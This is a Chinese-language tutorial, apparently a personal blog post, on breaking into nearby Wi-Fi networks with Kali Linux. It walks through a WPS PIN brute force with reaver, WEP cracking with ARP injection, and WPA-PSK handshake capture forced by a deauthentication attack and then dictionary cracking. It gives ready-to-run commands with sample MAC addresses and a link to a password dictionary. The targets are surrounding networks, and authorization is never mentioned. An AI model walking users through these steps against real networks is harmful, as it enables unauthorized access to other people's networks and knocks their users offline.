#### 准备

1. 安装好vmware和kali,运行;vmware10可以到腾讯软件中心下,kali到[官网](https://www.kali.org/) 下载合适的;
2. 无线网卡要选合适的,我就遇到linux下不读取的,再次在京东上买了EP-N8508GS就可以了;
3. 如果插入无线网卡不显示,则在kali 终端中运行,重启网络

/etc/init.d/networking restart #使网络配置生效

#### 什么是Aircrack-ng

> Aircrack-ng是一款用于破解无线802.11WEP及WPA-PSK加密的工具，该工具在2005年11月之前名字是Aircrack，在其2.41版本之后才改名为Aircrack-ng。
>
> Aircrack-ng主要使用了两种攻击方式进行WEP破解：一种是FMS攻击，该攻击方式是以发现该WEP漏洞的研究人员名字Scott Fluhrer、Itsik Mantin及Adi Shamir）所命名；另一种是KoreK攻击，经统计，该攻击方式的攻击效率要远高于FMS攻击。当然，最新的版本又集成了更多种类型的攻击方式。对于无线黑客而言，Aircrack-ng是一款必不可缺的无线攻击工具，可以说很大一部分无线攻击都依赖于它来完成；而对于无线安全人员而言，Aircrack-ng也是一款必备的无线安全检测工具，它可以帮助管理员进行无线网络密码的脆弱性检查及了解无线网络信号的分布情况，非常适合对企业进行无线安全审计时使用。

| 组件名称    | 描 述                                                        |
| ----------- | ------------------------------------------------------------ |
| aircrack-ng | 主要用于WEP及WPA-PSK密码的恢复，只要airodump-ng收集到足够数量的数据包，aircrack-ng就可以自动检测数据包并判断是否可以破解 |
| airmon-ng   | 用于改变无线网卡工作模式，以便其他工具的顺利使用             |
| airodump-ng | 用于捕获802.11数据报文，以便于aircrack-ng破解                |
| aireplay-ng | 在进行WEP及WPA-PSK密码恢复时，可以根据需要创建特殊的无线网络数据报文及流量 |
| airserv-ng  | 可以将无线网卡连接至某一特定端口，为攻击时灵活调用做准备     |
| airolib-ng  | 进行WPA Rainbow Table攻击时使用，用于建立特定数据库文件      |
| airdecap-ng | 用于解开处于加密状态的数据包                                 |
| tools       | 其他用于辅助的工具，如airdriver-ng、packetforge-ng等         |

#### 第一个方法: pin码破解法

1. 网卡切换到监听模式: airmon-ng start wlan1,如果监听模式切换失败，请看第一篇的内容;如果不行,运行 airodump-ng wlan0mon
2. 在命令行中输入:wash -i wlan1,扫描开启wps的wifi设备。WPS Locked为No的都可以爆破试试。
3. 下面正式用reaver工具正式破解

reaver -i wlan1 -b 54:E6:FC:35:C5:82 -S -N -vv -c 4

//注意最后的4字是一个通道,要注意改下;

注意: 一时半会pin不出来，过段时间pin的时候命令加参数 -s file.wpc，就会根据之前的进度继续pin。

结果我没有成功,我百度了一下,发现原来是市场上的wifi路由器都是没有pin或者防pin的,我也发现在我周围的wifi信号源,10个没有2个是支持wps(PIN)的;所以这个方法还是放弃好点;

#### 第二个方法： Aircrack-ng破解WEP（用途少）

1. 终端处输入ifconfig wlan0 up 用于加载网卡，ifconfig或者iwconfig查看无线网卡的状态。

2. airmon-ng start wlan0 激活网卡的监听模式。

3. 探测当前无线终端的当时的无线网络环境，输入 airodump-ng mon0 ,

   参数说明：mon0为之前已经载入并激活监听模式的无线网卡。

4. 开始攻击ssidd名的无线路由器，airodump-ng --ivs –w longas -c 6 wlan0,

   参数说明：

   --ivs 这里的设置是通过设置过滤，不再将所有无线数据保存，而只是保存可用于破解的IVS数据报文，这样可以有效地缩减保存的数据包大小；

   -c 这里我们设置目标AP的工作频道，通过刚才的观察，我们要进行攻击测试的无线路由器工作频道为6；

   -w 后跟要保存的文件名，这里w就是“write写”的意思，所以输入自己希望保持的文件名，如下图10所示我这里就写为longas。那么，小黑们一定要注意的是：这里我们虽然设置保存的文件名是longas，但是生成的文件却不是longase.ivs，而是longas-01.ivs。

5. 对目标ap使用ArpRequest注入攻击(加快进程)，输入 aireplay-ng -3 -b AP的mac -h 客户端的mac mon0,

   参数说明： -3 指采用ARPRequesr注入攻击模式；

   -b 后跟AP的MAC地址，这里就是前面我们探测到的SSID为TPLINK的AP的MAC；

   -h 后跟客户端的MAC地址，也就是我们前面探测到的有效无线客户端的MAC；

6. 打开 aircrack-ng,开始破解:

   键入aircrack-ng 捕获的ivs文件,

   ![img](file:///C:/Users/StephenWu5/AppData/Roaming/Typora/typora-user-images/1542545764629.png?lastModify=1542546241)

   当出现KEY FOUND！字段，恭喜，破解成功。

#### 第三个方法： Aircrack-ng破解wap-psk

暴力破解法(跑字典法)(抓包法)(tips:适用于wap-psk,wap2-psk加密方式)

1. 终端处输入ifconfig,确认无线网卡链接

2. airmon-ng start wlan0

   监听wlan0无线网卡

3. airodump-ng wlan0mon

   探测周围的wifi

   探测出来的，就是周围的wifi，以及正在使用wifi的客户端

   有用的参数，我具体说下

4. - BSSID：wifi的ID
   - STATION：使用wifi的人ID（我就说白话吧）
   - CH：wifi所在的频道

5. airodump-ng -c 10 --bssid D4:EE:07:12:57:80 -w result wlan0mon

   进入频道，开始抓包 -c：进入哪个频道。6的话就是6频道，也就是上图中的CH -w：保存结果的文件

   ![img](file:///C:/Users/StephenWu5/AppData/Roaming/Typora/typora-user-images/1542543192406.png?lastModify=1542546241)

6. 进行Deauth攻击加速破解过程(这个过程其实可以不要的,只不过为了加快过程,减少时间的投入)

   重新打开一个终端, 输入(手机或者电脑或者平板等) wlan0mon

   参数说明:

   -0 10：表示使用deauth攻击，进行10次攻击 -a：AP的MAC地址，也就是BSSID的号 -c：使用人的ID，也就是STATION 例如：aireplay-ng -0 10 -a 00:21:22:32:24:A7 -c 32:I9:21:34:54:D4 wlan0mon

7. aircrack-ng -w 字典文件 cap文件名称

   跑字典破解该wifi，发现密码 也就是说，你必须有

8. - 一个强大的wifi密码字典 我用的是[这个](http://n.didiwl.com//pc3/WIFImmzidianbao.zip)，我是在win10真机下好了字典，用vmware的管理可移动设备把usb移动U盘挂载到linux上。

   - 一个不错的用来跑密码的机器

   - 等啊等啊的耐心 如下图

   - ![img](file:///C:/Users/StephenWu5/AppData/Roaming/Typora/typora-user-images/1542543113753.png?lastModify=1542546241)

     图中的672.47是破解的速度;

     ![img](file:///C:/Users/StephenWu5/AppData/Roaming/Typora/typora-user-images/1542546244356.png?lastModify=1542546241)

9. 这速度无语了，最后运气好才能跑出来,运气不好,呵呵了。（跑出来的前提是该字典有这个wifi密码）破解WPA-PSK对硬件要求很高,所以你要多准备一些常用的字典比如生日,8位数字,这样破解的成功率才会打打提高。

#### 参考

1. 主要参考了这位大哥写的[文章](http://www.bkjia.com/aqgjrj/563962_5.html)；